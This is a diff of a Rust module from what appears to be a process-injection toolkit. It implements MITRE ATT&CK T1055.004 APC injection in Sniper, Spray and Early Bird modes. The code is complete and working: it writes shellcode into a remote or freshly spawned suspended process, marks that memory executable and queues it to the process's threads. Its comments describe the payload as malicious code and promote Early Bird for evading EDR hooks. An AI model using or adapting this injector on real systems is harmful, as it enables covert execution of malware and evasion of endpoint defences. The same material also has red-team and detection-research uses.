@@ -1,126 +1,112 @@
-//! Implementation of MITRE ATT&CK T1055.004: Asynchronous Procedure Call.
+//! Implementation of **MITRE ATT&CK T1055.004: Asynchronous Procedure Call (APC)**.
 //!
-//! Provides capabilities to queue APCs to threads in a remote process.
-//! This module implements both "Sniper" (single thread) and "Shotgun" (all threads) approaches.
+//! This module utilizes the Windows APC mechanism to force a target thread to execute
+//! malicious code when it enters an "Alertable State". It supports three distinct
+//! operational modes:
+//! * **Sniper:** Queues the payload to a single thread.
+//! * **Spray:** Queues the payload to *all* threads in the target to maximize execution probability.
+//! * **Early Bird:** Spawns a suspended process, queues the APC to the main thread, and resumes it.
+//!   This is highly effective for evasion as code executes before many EDR hooks are placed.
 
 use std::{
     mem::transmute,
+    os::windows::ffi::OsStrExt,
+    path::Path,
     ptr::{null, null_mut},
 };
 
-use windows_sys::{
-    Win32::{
-        Foundation::{CloseHandle, FALSE, GetLastError, HANDLE, INVALID_HANDLE_VALUE, PAPCFUNC},
-        System::{
-            Diagnostics::{
-                Debug::WriteProcessMemory,
-                ToolHelp::{
-                    CreateToolhelp32Snapshot, TH32CS_SNAPTHREAD, THREADENTRY32, Thread32First,
-                    Thread32Next,
-                },
-            },
-            Memory::{
-                MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_READWRITE, VirtualAllocEx,
-                VirtualProtectEx,
-            },
-            Threading::{
-                CREATE_SUSPENDED, CreateProcessW, OpenProcess, OpenThread, PROCESS_INFORMATION,
-                PROCESS_VM_OPERATION, PROCESS_VM_READ, PROCESS_VM_WRITE, QueueUserAPC,
-                ResumeThread, STARTF_USESHOWWINDOW, STARTUPINFOW, THREAD_SET_CONTEXT,
+use windows_sys::Win32::{
+    Foundation::{CloseHandle, FALSE, GetLastError, HANDLE, INVALID_HANDLE_VALUE, PAPCFUNC},
+    System::{
+        Diagnostics::{
+            Debug::WriteProcessMemory,
+            ToolHelp::{
+                CreateToolhelp32Snapshot, TH32CS_SNAPTHREAD, THREADENTRY32, Thread32First,
+                Thread32Next,
             },
         },
+        Memory::{
+            MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_READWRITE, VirtualAllocEx,
+            VirtualProtectEx,
+        },
+        Threading::{
+            CREATE_SUSPENDED, CreateProcessW, OpenProcess, OpenThread, PROCESS_INFORMATION,
+            PROCESS_VM_OPERATION, PROCESS_VM_READ, PROCESS_VM_WRITE, QueueUserAPC, ResumeThread,
+            STARTF_USESHOWWINDOW, STARTUPINFOW, THREAD_SET_CONTEXT,
+        },
     },
-    w,
 };
 
 use crate::{
-    error::InjectumError,
-    info,
+    Error, Result, info,
     payload::Payload,
-    strategy::{Method, Strategy, Technique},
+    strategy::{AsynchronousProcedureCall, Strategy, Technique},
     target::Target,
 };
 
-/// The strategy implementation for T1055.004 (Asynchronous Procedure Call).
+/// The concrete strategy implementation for T1055.004.
 #[derive(Default)]
 pub(crate) struct T1055_004;
 
-/// Internal enum to strictly define sub-techniques.
-#[derive(Debug, PartialEq)]
-enum InjectionMethod {
-    SniperAPC,
-    SprayAPC,
-    EarlyBird,
-}
-
-impl TryFrom<Method> for InjectionMethod {
-    type Error = InjectumError;
-
-    fn try_from(method: Method) -> Result<Self, Self::Error> {
-        match method.0 {
-            "SniperAPC" => Ok(Self::SniperAPC),
-            "SprayAPC" => Ok(Self::SprayAPC),
-            "EarlyBird" => Ok(Self::EarlyBird),
-            _ => Err(InjectumError::MethodNotSupported(method.0.to_string())),
-        }
-    }
-}
-
 impl Strategy for T1055_004 {
-    fn requires_pid(&self, method: Method) -> bool {
-        match method.0 {
-            "EarlyBird" => false,
-            _ => true,
-        }
-    }
-
-    fn execute(
-        &self,
-        payload: &Payload,
-        target: &Target,
-        method: Method,
-    ) -> Result<(), InjectumError> {
-        let info = Technique::T1055_004.info();
+    fn execute(&self, technique: &Technique, payload: &Payload, target: &Target) -> Result<()> {
+        let info = technique.info();
         info!("Strategy: {} ({})", info.mitre_id, info.name);
 
-        let variant: InjectionMethod = method.try_into()?;
+        // 1. Unwrap the configuration specific to this technique.
+        let method = match technique {
+            Technique::T1055_004(m) => m,
+            _ => return Err(Error::Execution("Internal dispatch error".into())),
+        };
 
-        // 1. Validate Payload
+        // 2. Validate Payload: Must be Shellcode.
         let shellcode = match payload {
-            Payload::Shellcode { bytes: b, .. } => b,
+            Payload::Shellcode { bytes, .. } => bytes,
             _ => {
-                return Err(InjectumError::PayloadMismatch {
+                return Err(Error::Mismatch {
                     strategy: info.mitre_id,
-                    payload_type: "Shellcode",
+                    variant: payload.variant_name(),
                 });
             }
         };
 
-        // 2. Execution based on variant
-        match variant {
-            InjectionMethod::SniperAPC => {
-                info!("Method: Classic APC (Sniper Mode)");
-                let pid = target
-                    .pid()
-                    .ok_or(InjectumError::PidRequired(info.mitre_id))?;
-                apc_injection_sniper(pid, shellcode)
-            }
-            InjectionMethod::SprayAPC => {
-                info!("Method: Spray APC (Shotgun Mode)");
-                let pid = target
-                    .pid()
-                    .ok_or(InjectumError::PidRequired(info.mitre_id))?;
-                apc_injection_shotgun(pid, shellcode)
-            }
-            InjectionMethod::EarlyBird => {
-                info!("Method: Early Bird");
-                apc_injection_early_bird(shellcode)
-            }
+        // 3. Dispatch based on the specific APC variant selected.
+        match method {
+            // Standard Injection: Targets an existing running process.
+            AsynchronousProcedureCall::Sniper | AsynchronousProcedureCall::Spray => match target {
+                Target::Pid(process_id) => {
+                    info!(
+                        "Method: Standard APC ({})",
+                        match method {
+                            AsynchronousProcedureCall::Sniper => "Sniper",
+                            _ => "Spray",
+                        }
+                    );
+                    apc_injection_standard(*process_id, shellcode, method)
+                }
+                _ => Err(Error::Validation(format!(
+                    "Strategy '{}' requires a Target PID.",
+                    info.mitre_id
+                ))),
+            },
+            // Early Bird: Spawns a new process to inject into.
+            AsynchronousProcedureCall::EarlyBird => match target {
+                Target::Spawn(target_path) => {
+                    info!("Method: Early Bird");
+                    apc_injection_early_bird(shellcode, target_path)
+                }
+                _ => Err(Error::Validation(
+                    "EarlyBird APC requires Target::Spawn(path)".into(),
+                )),
+            },
         }
     }
 }
 
-/// Wrapper to ensure handles are closed when they go out of scope.
+/// A RAII (Resource Acquisition Is Initialization) wrapper for Windows Handles.
+///
+/// Ensures that `CloseHandle` is automatically called when the scope ends,
+/// preventing resource leaks in the operating system.
 struct HandleGuard(HANDLE);
 
 impl HandleGuard {
@@ -137,36 +123,45 @@ impl Drop for HandleGuard {
     }
 }
 
-/// [Classic APC Injection]
-/// Queues an APC to a single thread (usually the main thread) of an existing process.
-fn apc_injection_sniper(pid: u32, shellcode: &[u8]) -> Result<(), InjectumError> {
+/// Performs Standard APC Injection on an existing process.
+///
+/// # Logic
+/// 1. **Snapshot**: Enumerate threads in the target process.
+/// 2. **Alloc/Write/Protect**: Place shellcode into target memory.
+/// 3. **QueueUserAPC**: Queue the shellcode execution routine to the target thread(s).
+///
+/// # Limitation
+/// The target thread executes the APC *only* when it enters an "Alertable State"
+/// (e.g., calling `SleepEx`, `WaitForSingleObjectEx`). If the thread never sleeps,
+/// the payload never runs. This is why "Spray" is often used.
+fn apc_injection_standard(
+    process_id: u32,
+    shellcode: &[u8],
+    method: &AsynchronousProcedureCall,
+) -> Result<()> {
     // 1. Enumerate Threads
-    let threads = find_target_threads(pid)?;
-    // We just pick the first thread we find. In a robust tool, you might check if the thread is in an alertable state.
-    let target_thread_id = threads[0];
-    info!("Targeting Thread ID: {}", target_thread_id);
+    let thread_ids = find_target_threads(process_id)?;
+    info!("Found {} threads in target process.", thread_ids.len());
 
     // 2. Open Target Process
     let process_handle = unsafe {
         OpenProcess(
             PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
             FALSE,
-            pid,
+            process_id,
         )
     };
 
     if process_handle.is_null() {
-        return Err(InjectumError::Win32Error("OpenProcess", unsafe {
-            GetLastError()
-        }));
+        return Err(Error::Win32("OpenProcess", unsafe { GetLastError() }));
     }
 
-    let process_handle_guard = HandleGuard::new(process_handle);
+    let process_guard = HandleGuard::new(process_handle);
 
-    // 3. Allocate Memory RW (Read-Write)
-    let remote_buffer = unsafe {
+    // 3. Allocate Memory (RW)
+    let remote_addr = unsafe {
         VirtualAllocEx(
-            process_handle_guard.0,
+            process_guard.0,
             null(),
             shellcode.len(),
             MEM_COMMIT | MEM_RESERVE,
@@ -174,229 +169,126 @@ fn apc_injection_sniper(pid: u32, shellcode: &[u8]) -> Result<(), InjectumError>
         )
     };
 
-    if remote_buffer.is_null() {
-        return Err(InjectumError::Win32Error("VirtualAllocEx", unsafe {
-            GetLastError()
-        }));
+    if remote_addr.is_null() {
+        return Err(Error::Win32("VirtualAllocEx", unsafe { GetLastError() }));
     }
 
-    // 4. Write Shellcode to Target Memory
-    let mut bytes_written: usize = 0;
+    // 4. Write Shellcode
+    let mut write_len: usize = 0;
 
-    let write_success = unsafe {
+    let success = unsafe {
         WriteProcessMemory(
-            process_handle_guard.0,
-            remote_buffer,
+            process_guard.0,
+            remote_addr,
             shellcode.as_ptr().cast(),
             shellcode.len(),
-            &mut bytes_written,
+            &mut write_len,
         )
     };
 
-    if write_success == 0 || bytes_written != shellcode.len() {
-        return Err(InjectumError::Win32Error("WriteProcessMemory", unsafe {
+    if success == 0 || write_len != shellcode.len() {
+        return Err(Error::Win32("WriteProcessMemory", unsafe {
             GetLastError()
         }));
     }
 
-    // 5. Change Protection to RX (Execute-Read)
-    let mut old_protect: u32 = 0;
+    // 5. Protect Memory (RX)
+    let mut old_protection: u32 = 0;
 
-    let protect_success = unsafe {
+    let success = unsafe {
         VirtualProtectEx(
-            process_handle_guard.0,
-            remote_buffer,
+            process_guard.0,
+            remote_addr,
             shellcode.len(),
             PAGE_EXECUTE_READ,
-            &mut old_protect,
+            &mut old_protection,
         )
     };
 
-    if protect_success == 0 {
-        return Err(InjectumError::Win32Error("VirtualProtectEx", unsafe {
-            GetLastError()
-        }));
+    if success == 0 {
+        return Err(Error::Win32("VirtualProtectEx", unsafe { GetLastError() }));
     }
 
-    // 6. Open Thread
-    let thread_handle = unsafe { OpenThread(THREAD_SET_CONTEXT, FALSE, target_thread_id) };
+    // 6. Queue APC(s)
+    let routine_ptr: PAPCFUNC = unsafe { transmute(remote_addr) };
 
-    if thread_handle.is_null() {
-        return Err(InjectumError::Win32Error("OpenThread", unsafe {
-            GetLastError()
-        }));
-    }
+    let mut success_count = 0;
 
-    let _thread_guard = HandleGuard::new(thread_handle);
-
-    // 7. Queue APC
-    let papc_func: PAPCFUNC = unsafe { transmute(remote_buffer) };
-
-    // The thread will execute this when it enters an alertable state.
-    let result = unsafe { QueueUserAPC(papc_func, thread_handle, 0) };
-
-    if result == 0 {
-        return Err(InjectumError::Win32Error("QueueUserAPC", unsafe {
-            GetLastError()
-        }));
-    }
-
-    Ok(())
-}
-
-/// [Spray APC Injection]
-/// Queues an APC to *every* thread in the target process to maximize execution chance.
-fn apc_injection_shotgun(pid: u32, shellcode: &[u8]) -> Result<(), InjectumError> {
-    // 1. Enumerate Threads
-    let threads = find_target_threads(pid)?;
-    info!("Found {} threads in target process.", threads.len());
-
-    // 2. Open Target Process
-    let process_handle = unsafe {
-        OpenProcess(
-            PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
-            FALSE,
-            pid,
-        )
+    // Logic:
+    // Sniper picks the first thread.
+    // Spray targets all of them.
+    let threads_to_target = match method {
+        AsynchronousProcedureCall::Sniper => &thread_ids[0..1],
+        _ => &thread_ids[..],
     };
 
-    if process_handle.is_null() {
-        return Err(InjectumError::Win32Error("OpenProcess", unsafe {
-            GetLastError()
-        }));
-    }
-
-    let process_handle_guard = HandleGuard::new(process_handle);
-
-    // 3. Allocate Memory RW (Read-Write)
-    let remote_buffer = unsafe {
-        VirtualAllocEx(
-            process_handle_guard.0,
-            null(),
-            shellcode.len(),
-            MEM_COMMIT | MEM_RESERVE,
-            PAGE_READWRITE,
-        )
-    };
-
-    if remote_buffer.is_null() {
-        return Err(InjectumError::Win32Error("VirtualAllocEx", unsafe {
-            GetLastError()
-        }));
-    }
-
-    // 4. Write Shellcode to Target Memory
-    let mut bytes_written: usize = 0;
-    let write_success = unsafe {
-        WriteProcessMemory(
-            process_handle_guard.0,
-            remote_buffer,
-            shellcode.as_ptr().cast(),
-            shellcode.len(),
-            &mut bytes_written,
-        )
-    };
-
-    if write_success == 0 || bytes_written != shellcode.len() {
-        return Err(InjectumError::Win32Error("WriteProcessMemory", unsafe {
-            GetLastError()
-        }));
-    }
-
-    // 5. Change Protection to RX (Execute-Read)
-    let mut old_protect: u32 = 0;
-
-    let protect_success = unsafe {
-        VirtualProtectEx(
-            process_handle_guard.0,
-            remote_buffer,
-            shellcode.len(),
-            PAGE_EXECUTE_READ,
-            &mut old_protect,
-        )
-    };
-
-    if protect_success == 0 {
-        return Err(InjectumError::Win32Error("VirtualProtectEx", unsafe {
-            GetLastError()
-        }));
-    }
-
-    // 6. Queue APC
-    let papc_func: PAPCFUNC = unsafe { transmute(remote_buffer) };
-
-    // Index 0 = Failure (0), Index 1 = Success (!0)
-    // We initialize it as [0 failures, 0 successes]
-    let mut stats = [0usize; 2];
-
-    // 7. Loop through all threads
-    for thread_id in threads {
+    for &thread_id in threads_to_target {
+        // Specific permission: THREAD_SET_CONTEXT is required for QueueUserAPC.
         let thread_handle = unsafe { OpenThread(THREAD_SET_CONTEXT, FALSE, thread_id) };
-
         if !thread_handle.is_null() {
-            let _thread_guard = HandleGuard::new(thread_handle);
-            stats[(unsafe { QueueUserAPC(papc_func, thread_handle, 0) } != 0) as usize] += 1;
-        } else {
-            stats[0] += 1;
+            let _guard = HandleGuard::new(thread_handle);
+            if unsafe { QueueUserAPC(routine_ptr, thread_handle, 0) } != 0 {
+                success_count += 1;
+            }
         }
     }
 
-    info!(
-        "APC Spray Complete. Queued: {}, Failed/Skipped: {}",
-        stats[1], stats[0]
-    );
-
-    if stats[1] == 0 {
-        return Err(InjectumError::General(
-            "Failed to queue APC to any threads.".to_string(),
+    if success_count == 0 {
+        return Err(Error::Execution(
+            "Failed to queue APC to any threads.".into(),
         ));
     }
 
+    info!("APC Queued successfully to {} thread(s).", success_count);
     Ok(())
 }
 
-/// [Early Bird Injection]
-/// Spawns a process in a suspended state, queues an APC, and resumes it.
-fn apc_injection_early_bird(shellcode: &[u8]) -> Result<(), InjectumError> {
-    let s_info = STARTUPINFOW {
+/// Performs **Early Bird** APC Injection.
+///
+/// # Logic
+/// 1. **CreateProcessW (Suspended)**: Start a benign process (e.g., `notepad.exe`) but pause the main thread.
+/// 2. **Alloc/Write/Protect**: Place shellcode into the *new* process memory.
+/// 3. **QueueUserAPC**: Queue shellcode to the main thread. Since the thread is suspended, the APC is pending.
+/// 4. **ResumeThread**: Resuming the thread forces it to immediately process the APC queue before executing the process entry point.
+fn apc_injection_early_bird(shellcode: &[u8], target_path: &Path) -> Result<()> {
+    let startup_info = STARTUPINFOW {
         cb: size_of::<STARTUPINFOW>() as u32,
         dwFlags: STARTF_USESHOWWINDOW,
         ..Default::default()
     };
+    let mut process_info = PROCESS_INFORMATION::default();
+    let path_utf16 = to_utf16_null_terminated(target_path);
 
-    let mut p_info = PROCESS_INFORMATION::default();
+    info!("EarlyBird: Spawning suspended process {:?}", target_path);
 
-    info!("Spawning suspended process: cmd.exe");
-
-    // 1. Create Suspended Process
-    let create_process = unsafe {
+    // 1. Spawn Suspended
+    let success = unsafe {
         CreateProcessW(
-            w!("C:\\Windows\\System32\\cmd.exe"),
+            path_utf16.as_ptr(),
             null_mut(),
             null(),
             null(),
             FALSE,
             CREATE_SUSPENDED,
             null(),
-            w!("C:\\Windows\\System32"),
-            &s_info,
-            &mut p_info,
+            null(),
+            &startup_info,
+            &mut process_info,
         )
     };
 
-    if create_process == 0 {
-        return Err(InjectumError::Win32Error("CreateProcessW", unsafe {
-            GetLastError()
-        }));
+    if success == 0 {
+        return Err(Error::Win32("CreateProcessW", unsafe { GetLastError() }));
     }
 
-    let process_handle_guard = HandleGuard::new(p_info.hProcess);
-    let thread_handle_guard = HandleGuard::new(p_info.hThread);
+    // Guards must be created immediately to ensure cleanup if injection fails.
+    let process_guard = HandleGuard::new(process_info.hProcess);
+    let thread_guard = HandleGuard::new(process_info.hThread);
 
     // 2. Allocate Memory RW (Read-Write)
-    let remote_buffer = unsafe {
+    let remote_addr = unsafe {
         VirtualAllocEx(
-            process_handle_guard.0,
+            process_guard.0,
             null(),
             shellcode.len(),
             MEM_COMMIT | MEM_RESERVE,
@@ -404,119 +296,114 @@ fn apc_injection_early_bird(shellcode: &[u8]) -> Result<(), InjectumError> {
         )
     };
 
-    if remote_buffer.is_null() {
-        return Err(InjectumError::Win32Error("VirtualAllocEx", unsafe {
-            GetLastError()
-        }));
+    if remote_addr.is_null() {
+        return Err(Error::Win32("VirtualAllocEx", unsafe { GetLastError() }));
     }
 
-    // 3. Write Shellcode to Target Memory
-    let mut bytes_written: usize = 0;
+    // 3. Write Shellcode
+    let mut write_len: usize = 0;
 
-    let write_success = unsafe {
+    let success = unsafe {
         WriteProcessMemory(
-            process_handle_guard.0,
-            remote_buffer,
+            process_guard.0,
+            remote_addr,
             shellcode.as_ptr().cast(),
             shellcode.len(),
-            &mut bytes_written,
+            &mut write_len,
         )
     };
 
-    if write_success == 0 || bytes_written != shellcode.len() {
-        return Err(InjectumError::Win32Error("WriteProcessMemory", unsafe {
+    if success == 0 || write_len != shellcode.len() {
+        return Err(Error::Win32("WriteProcessMemory", unsafe {
             GetLastError()
         }));
     }
 
-    // 4. Change Protection to RX (Execute-Read)
-    let mut old_protect: u32 = 0;
+    // 4. Protect Memory (RX)
+    let mut old_protection: u32 = 0;
 
-    let protect_success = unsafe {
+    let success = unsafe {
         VirtualProtectEx(
-            process_handle_guard.0,
-            remote_buffer,
+            process_guard.0,
+            remote_addr,
             shellcode.len(),
             PAGE_EXECUTE_READ,
-            &mut old_protect,
+            &mut old_protection,
         )
     };
 
-    if protect_success == 0 {
-        return Err(InjectumError::Win32Error("VirtualProtectEx", unsafe {
-            GetLastError()
-        }));
+    if success == 0 {
+        return Err(Error::Win32("VirtualProtectEx", unsafe { GetLastError() }));
     }
 
     // 5. Queue APC
-    let papc_func: PAPCFUNC = unsafe { transmute(remote_buffer) };
+    let routine_ptr: PAPCFUNC = unsafe { transmute(remote_addr) };
 
-    // QueueUserAPC on the main thread (which is suspended).
-    let queue_result = unsafe { QueueUserAPC(papc_func, thread_handle_guard.0, 0) };
+    // The APC is queued to the suspended main thread.
+    let success = unsafe { QueueUserAPC(routine_ptr, thread_guard.0, 0) };
 
-    if queue_result == 0 {
-        return Err(InjectumError::Win32Error("QueueUserAPC", unsafe {
-            GetLastError()
-        }));
+    if success == 0 {
+        return Err(Error::Win32("QueueUserAPC", unsafe { GetLastError() }));
     }
 
     info!("APC Queued. Resuming thread...");
 
-    // 4. Resume Thread
-    let resume_result = unsafe { ResumeThread(thread_handle_guard.0) };
+    // 6. Resume Thread
+    // This triggers the APC immediately.
+    let suspend_count = unsafe { ResumeThread(thread_guard.0) };
 
-    if resume_result == u32::MAX {
-        return Err(InjectumError::Win32Error("ResumeThread", unsafe {
-            GetLastError()
-        }));
+    if suspend_count == u32::MAX {
+        return Err(Error::Win32("ResumeThread", unsafe { GetLastError() }));
     }
 
     Ok(())
 }
 
-/// Helper: Finds all threads belonging to a specific PID using ToolHelp32.
-fn find_target_threads(pid: u32) -> Result<Vec<u32>, InjectumError> {
+/// Helper: Snapshots the target process to find all active Thread IDs.
+fn find_target_threads(process_id: u32) -> Result<Vec<u32>> {
     let snapshot_handle = unsafe { CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0) };
 
     if snapshot_handle == INVALID_HANDLE_VALUE {
-        return Err(InjectumError::Win32Error(
-            "CreateToolhelp32Snapshot",
-            unsafe { GetLastError() },
-        ));
+        return Err(Error::Win32("CreateToolhelp32Snapshot", unsafe {
+            GetLastError()
+        }));
     }
 
     let _snapshot_guard = HandleGuard::new(snapshot_handle);
 
-    let mut t_entry = THREADENTRY32 {
+    let mut thread_entry = THREADENTRY32 {
         dwSize: size_of::<THREADENTRY32>() as u32,
         ..Default::default()
     };
 
-    if unsafe { Thread32First(snapshot_handle, &mut t_entry) } == FALSE {
-        return Err(InjectumError::Win32Error("Thread32First", unsafe {
-            GetLastError()
-        }));
+    if unsafe { Thread32First(snapshot_handle, &mut thread_entry) } == FALSE {
+        return Err(Error::Win32("Thread32First", unsafe { GetLastError() }));
     }
 
     let mut thread_ids = Vec::new();
 
     loop {
-        if t_entry.th32OwnerProcessID == pid {
-            thread_ids.push(t_entry.th32ThreadID);
+        if thread_entry.th32OwnerProcessID == process_id {
+            thread_ids.push(thread_entry.th32ThreadID);
         }
 
-        t_entry.dwSize = size_of::<THREADENTRY32>() as u32;
+        thread_entry.dwSize = size_of::<THREADENTRY32>() as u32;
 
-        if unsafe { Thread32Next(snapshot_handle, &mut t_entry) } == FALSE {
+        if unsafe { Thread32Next(snapshot_handle, &mut thread_entry) } == FALSE {
             break;
         }
     }
 
     if thread_ids.is_empty() {
-        return Err(InjectumError::General(
+        return Err(Error::Execution(
             "No threads found for target process.".to_string(),
         ));
     }
 
     Ok(thread_ids)
+}
+
+/// Helper: Converts a Rust Path to a null-terminated UTF-16 vector.
+fn to_utf16_null_terminated(path: &Path) -> Vec<u16> {
+    path.as_os_str().encode_wide().chain([0]).collect()
 }
